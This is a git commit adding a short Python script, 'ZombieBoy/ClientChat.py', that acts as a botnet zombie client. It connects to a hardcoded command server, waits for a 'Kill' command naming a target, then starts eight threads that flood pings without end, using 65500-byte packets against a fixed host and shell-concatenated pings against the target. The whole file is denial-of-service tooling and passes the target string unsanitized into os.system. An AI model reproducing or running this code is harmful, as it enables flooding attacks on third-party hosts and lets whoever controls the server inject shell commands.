982d823cf37d4d96b0fee7395312a2f0216dbabd
Hugo Proulx <hugoproulx19@gmail.com>
2019-05-09 16:04:35 -0400

    Zombie boy

---
+++ ZombieBoy/ClientChat.py
@@ -0,0 +1,40 @@
+import socket
+import threading
+import subprocess
+import os
+
+
+def thread_recevoir(client_socket):
+    while True:
+        print("on attend")
+        reponse = client_socket.recv(1024).decode()
+        print("recu")
+        print(reponse)
+        text = reponse.split()
+        print(text[0])
+        if (text[0] == 'Kill'):
+            print("yolo")
+            for i in range(0, 8):
+                allo = threading.Thread(target=thread_ping, args=(text[1],))
+                allo.start()
+
+
+def thread_ping(rest):
+    while True:
+        hostname = "69.69.69.69"  # example
+        subprocess.call(['ping', "-l", "65500", "-w", "1", "-n", "1", hostname])
+        response = os.system("ping -c 3 " + rest)
+
+
+server_ip = "69.69.69.69"
+serveur_port = 4200
+
+client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+client.connect((server_ip, serveur_port))
+thread_recevoir2 = threading.Thread(target=thread_recevoir, args={client, })
+
+thread_recevoir2.start()
+
+while True:
+    texte = input()
+    client.send(str.encode(texte))
